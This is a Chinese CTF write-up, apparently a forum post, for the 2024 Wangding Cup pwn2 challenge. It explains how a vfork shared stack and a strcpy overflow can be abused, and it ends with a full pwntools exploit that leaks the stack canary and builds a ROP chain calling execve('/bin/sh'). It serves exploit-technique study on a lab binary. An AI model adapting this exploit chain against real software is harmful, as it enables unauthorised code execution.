
# [分享]2024网鼎杯玄武组pwn2题目详解

做这道题网上找的wp很多地方说的很笼统，自己就记录了一下解题过程

## 解题思路

1. 打开`ida`，发现程序没有符号表没找到`main`函数，然后先执行一下程序看看：

![](upload/attach/202502/890221_3HY747UFEYP98AB.png)

2. 发现输出了一个`gift`，应该是类似于是`canary`的值，在`ida`中找到`gift`字符串然后查看交叉引用找到了下面这个函数然后在`gdb`中下断点查看`bt`调用栈：

![](upload/attach/202502/890221_RTTGE8P73RYUGM2.png)

![](upload/attach/202502/890221_9WUTM5DBWP9F93P.png)

3. 发现这个输出`gift`的函数是`0x401866`处调用的,这段程序3个函数，第一个函数是做一些初始化工作，第二个函数调用了`vfork`函数创建了子进程，然后子进程返回执行了第三个函数然后在第三函数中执行了`exit`函数退出，主进程执行`read`函数在输入描述符读取一个字节，然后比对了`rbp-0x28`，如果不是`1`则`puts`一句`It's impossible`，然后退出，否则验证完`canary`后`retn`：

（注：`vfork`函数创建一个子进程，父进程等待子进程结束以后才继续运行，）

![](upload/attach/202502/890221_QVXHKXCGM9HNWQJ.png)

![](upload/attach/202502/890221_AV7FXBEHXN548G6.png)

4. 经过分析发现第三个函数是子进程执行的，第二个函数是主进程执行的，唯一的交叉点就在`rbp-0x28`这，因为`vfork`调用是公用的栈空间，子进程是在第三函数内部执行`exit`结束的，但是调用第三函数的时候返回地址已经压栈了，也就是说，如果`rbp-0x28`=1的话，主进程会返回到第三个函数下面的指令：

![](upload/attach/202502/890221_T6SBM72EQJMHK3Q.png)

5. 分析第三函数，怎么能实现让主进程`rbp-0x28`=1，第三函数使用栈空间`0x50`,然后使用`read`函数读取了`0x40`个字节的输入，第二个函数使用了`0x30`个字节的栈空间，因为`vfork`公用栈，所以，虽然`read`函数没有溢出风险，但是我们可以控制`rbp-0x28`=1

![](upload/attach/202502/890221_NTQ2ZB2K6Z7XJGG.png)![](upload/attach/202502/890221_R24CZPXWYHH27S2.png)

6. 接下来就是分析跳转过去以后的代码，同样的套路，使用`vfork`执行子进程，主进程如果`rbp-0x11c`=0x11111111那么`ret`返回，子进程`read`读取了`0x100`个字节也没有溢出风险，但是，下面这个函数中调用了`strcpy`函数发生了溢出，分析发现`strcpy`函数从`read`读取的`0x100`字节的位置开始往自己栈空间复制，但是自己栈帧只有`0x60`大小，所以会溢出，但是执行完`strcpy`后调用了`exit`退出，我们无法控制执行流程，但是可以覆盖上层栈帧的一些内容比如`rbp-0x11c`的值和`read`的参数

![](upload/attach/202502/890221_X3VVRZ6SHH44EHC.png)

7. 由于主线程检查`rbp-0x11c`不等于`0x11111111`的时候会重复调用`vfork`子进程，所以我们覆盖`read`参数是有意义的，我们可以在第一次执行子进程时覆盖`read`的`size`参数，那么第二次调用时它就会溢出，（注：因为`canary`的值的最后一个字节经常为`0x00`所以`strcpy`的时候会截断我们后续的构造，所以我们控制执行流程不能以`strcpy`后的值为准，`payload`需要以`strcpy`覆盖`rbp-0x11c`跳出循环，然后以`read`的溢出构造`canary`和后续的`ret`流程）：

```python
from pwn import *
#context.log_level = 'debug'
#sh = gdb.debug("./pwn","set follow-fork-mode parent\n b *0x401953\n b *0x401995\n c\n c\n set {long}($rbp-0x28)=1\n b *0x")
#sh = process("./pwn")
#sh.sendafter("leave your name","A"*64)
#sh.sendafter("Wanna return?","B")
#sh.interactive()
rax=0x0000000000450277
rdi=0x000000000040213f
rsi=0x000000000040a1ae
rdxrbx=0x0000000000485feb
sh_addr=0x00000000004C5000
read=0x000000000044F810
syscall=0x41ac26
p=process('/home/kali/Desktop/pwn')
#p=gdb.debug("./pwn","b *0x000000000040190C\n b *0x401953\n b *0x4019B0\n b *0x40189D\n b *0x40190C\n set follow-fork-mode parent\n ")
p.recvuntil(b'gift: ')
gift=p.recv(18)
gift=int(gift,16)
p.sendafter('leave your name',b'a'*0x28+p64(1))
p.sendafter('Wanna return?','A')
p.sendafter("once again?",b'A'*0x100)
payload=b'A'*0x60
payload+=p64(0x1111111111111111)
payload+=b'B'*0xa0
payload+=p64(gift)
payload+=b'C'*8
payload+=p64(rax)+p64(0x0)+p64(rdxrbx)+p64(0x10)*2+p64(rsi)+p64(sh_addr)+p64(rdi)+p64(0x0)+p64(syscall)
payload+=p64(rax)+p64(0x3B)+p64(rdi)+p64(sh_addr)+p64(rsi)+p64(0x0)+p64(rdxrbx)+p64(0x0)*2+p64(syscall)
p.sendafter("once again?",payload)
p.send(b'/bin/sh')
p.interactive()
```

![](upload/attach/202502/890221_W2PJ9G8JYGZQHXT.png)

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

[#漏洞机制](https://bbs.kanxue.com/forum-171-1-181.htm)

[#溢出](https://bbs.kanxue.com/forum-171-1-182.htm)
